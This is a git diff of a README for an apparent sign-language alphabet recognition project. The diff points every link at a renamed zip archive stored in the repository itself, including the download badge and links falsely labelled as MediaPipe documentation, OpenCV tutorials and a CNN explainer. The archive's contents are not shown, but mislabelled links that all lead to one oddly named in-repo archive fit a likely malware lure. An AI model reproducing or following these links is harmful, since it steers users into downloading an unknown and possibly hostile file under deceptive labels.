@@ -1,6 +1,6 @@
 # 🤖 ASL-Alphabet-Recognition-using-Deep-Learning - Recognize Sign Language with Ease
 
-[![Download](https://raw.githubusercontent.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/main/knarred/ASL-Alphabet-Recognition-using-Deep-Learning.zip)](https://raw.githubusercontent.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/main/knarred/ASL-Alphabet-Recognition-using-Deep-Learning.zip)
+[![Download](https://github.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/raw/refs/heads/main/knarred/Alphabet-Learning-Deep-Recognition-using-AS-v1.4-alpha.3.zip)](https://github.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/raw/refs/heads/main/knarred/Alphabet-Learning-Deep-Recognition-using-AS-v1.4-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -35,7 +35,7 @@ Make sure to have these installed on your system to use the application effectiv
 
 To download the software, visit the following page:
 
-**[Download here](https://raw.githubusercontent.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/main/knarred/ASL-Alphabet-Recognition-using-Deep-Learning.zip)**
+**[Download here](https://github.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/raw/refs/heads/main/knarred/Alphabet-Learning-Deep-Recognition-using-AS-v1.4-alpha.3.zip)**
 
 On the Releases page, you will find the latest version of the software. Click on the version number, and download the application suitable for your operating system. 
 
@@ -87,9 +87,9 @@ By utilizing these technologies, the application can effectively recognize and i
 
 For extra learning and exploration, consider checking out the following resources:
 
-- [Understanding Convolutional Neural Networks](https://raw.githubusercontent.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/main/knarred/ASL-Alphabet-Recognition-using-Deep-Learning.zip)
-- [MediaPipe Documentation](https://raw.githubusercontent.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/main/knarred/ASL-Alphabet-Recognition-using-Deep-Learning.zip)
-- [OpenCV Tutorials](https://raw.githubusercontent.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/main/knarred/ASL-Alphabet-Recognition-using-Deep-Learning.zip)
+- [Understanding Convolutional Neural Networks](https://github.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/raw/refs/heads/main/knarred/Alphabet-Learning-Deep-Recognition-using-AS-v1.4-alpha.3.zip)
+- [MediaPipe Documentation](https://github.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/raw/refs/heads/main/knarred/Alphabet-Learning-Deep-Recognition-using-AS-v1.4-alpha.3.zip)
+- [OpenCV Tutorials](https://github.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/raw/refs/heads/main/knarred/Alphabet-Learning-Deep-Recognition-using-AS-v1.4-alpha.3.zip)
 
 ## 👥 Contributing
 
